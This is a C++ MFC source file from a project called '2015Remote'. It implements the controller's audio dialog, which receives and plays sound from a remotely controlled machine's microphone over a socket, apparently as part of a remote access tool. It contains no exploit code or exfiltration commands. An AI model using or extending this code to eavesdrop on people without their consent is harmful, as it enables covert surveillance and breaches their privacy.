// AudioDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "AudioDlg.h"
#include "afxdialogex.h"


// CAudioDlg 对话框

IMPLEMENT_DYNAMIC(CAudioDlg, CDialog)

CAudioDlg::CAudioDlg(CWnd* pParent, IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
: CDialog(CAudioDlg::IDD, pParent)
	, m_bSend(FALSE)
{
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_AUDIO));  //处理图标
	m_bIsWorking	= TRUE;
	m_iocpServer	= IOCPServer;       //为类的成员变量赋值
	m_ContextObject		= ContextObject;
	m_hWorkThread  = NULL;
	m_nTotalRecvBytes = 0;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));        //得到被控端ip
	int iClientAddressLen = sizeof(ClientAddress);
	BOOL bResult = getpeername(m_ContextObject->sClientSocket,(SOCKADDR*)&ClientAddress, &iClientAddressLen);

	m_strIPAddress = bResult != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "";
}

CAudioDlg::~CAudioDlg()
{
}

void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Check(pDX, IDC_CHECK, m_bSend);
}


BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CAudioDlg 消息处理程序


BOOL CAudioDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	SetIcon(m_hIcon,FALSE);

	CString strString;
	strString.Format("%s - 语音监听", m_strIPAddress);
	SetWindowText(strString);

	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));

	//启动线程 判断CheckBox
	m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

DWORD  CAudioDlg::WorkThread(LPVOID lParam)
{
	CAudioDlg	*This = (CAudioDlg *)lParam;

	while (This->m_bIsWorking)
	{
		if (!This->m_bSend)
		{
			Sleep(1000);
			continue;
		}
		DWORD	dwBufferSize = 0;
		LPBYTE	szBuffer = This->m_AudioObject.GetRecordBuffer(&dwBufferSize);   //播放声音

		if (szBuffer != NULL && dwBufferSize > 0)
			This->m_iocpServer->OnClientPreSending(This->m_ContextObject, szBuffer, dwBufferSize); //没有消息头
	}
	return 0;
}

void CAudioDlg::OnReceiveComplete(void)
{
	m_nTotalRecvBytes += m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1;   //1000+ =1000 1
	CString	strString;
	strString.Format("Receive %d KBytes", m_nTotalRecvBytes / 1024);
	SetDlgItemText(IDC_TIP, strString);
	switch (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUDIO_DATA:
		{

			m_AudioObject.PlayBuffer(m_ContextObject->InDeCompressedBuffer.GetBuffer(1), 
				m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1);   //播放波形数据
			break;
		}

	default:
		// 传输发生异常数据
		break;
	}
}

void CAudioDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值

	m_ContextObject->v1 = 0;
	CancelIo((HANDLE)m_ContextObject->sClientSocket);
	closesocket(m_ContextObject->sClientSocket);

	m_bIsWorking = FALSE;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CDialog::OnClose();
	delete this;
}
